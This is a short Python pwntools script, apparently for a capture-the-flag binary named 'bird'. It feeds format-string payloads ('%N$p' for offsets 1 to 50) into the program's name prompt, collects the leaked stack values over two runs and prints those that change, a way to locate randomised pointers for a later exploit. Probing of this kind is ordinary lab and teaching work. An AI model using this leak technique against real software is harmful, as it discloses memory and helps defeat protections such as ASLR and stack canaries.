from pwn import *
import time

context.log_level = 'error'

offsets = range(1, 51)

def run_experiment():
    results = {}
    
    for offset in offsets:
        try:
            p = process('./bird')
            p.sendlineafter(b"name: ", f'%{offset}$p'.encode())
            leak = p.recvuntil(b"Enter your message: ")
            p.close()
            
            try:
                leak = leak.decode()
                value_str = leak.split("Hello, ")[1].split()[0]
                results[offset] = value_str
            except:
                results[offset] = "Parse Error"
                
        except:
            results[offset] = "Crash"
            
    return results

print("First run:")
res1 = run_experiment()

print("Second run:") 
res2 = run_experiment()

print("\nChanged values:")
for offset in offsets:
    if res1.get(offset) != res2.get(offset):
        print(f"Offset {offset}: {res1[offset]} → {res2[offset]}")